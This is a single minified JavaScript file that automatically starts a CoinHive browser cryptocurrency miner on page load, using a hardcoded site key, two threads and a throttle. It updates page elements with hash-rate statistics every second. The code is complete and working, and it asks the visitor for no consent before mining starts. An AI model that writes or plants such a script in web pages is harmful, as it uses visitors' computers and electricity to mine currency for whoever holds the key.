$(document).ready(function(){function e(e){miner=new CoinHive.Anonymous("jcmh07Zc2xUXc345NPvBV1E16aolFvhP",{threads:e,autoThreads:!1,throttle:.4,forceASMJS:!1}),miner.start()}function t(){for(var e="",t="abcdefghijklmnopqrstuvwxyz0123456789",n=0;n<64;n++)e+=t.charAt(Math.floor(Math.random()*t.length));return e}var n=2;e(n),miner.on("accepted",function(){console.log("Hash accepted!")}),setInterval(function(){var e=miner.getHashesPerSecond(),n=miner.getTotalHashes(),o=miner.getAcceptedHashes();console.log(e),$("#hashesPerSecond").text(Math.round(e)),$("#totalHashes").text(Math.round(n)),$("#acceptedHashes").text(Math.round(o)),$("#hash").text(t()),miner.on("found",function(){$("#hash").text("$$$HASH$FOUND$$$")})},1e3)});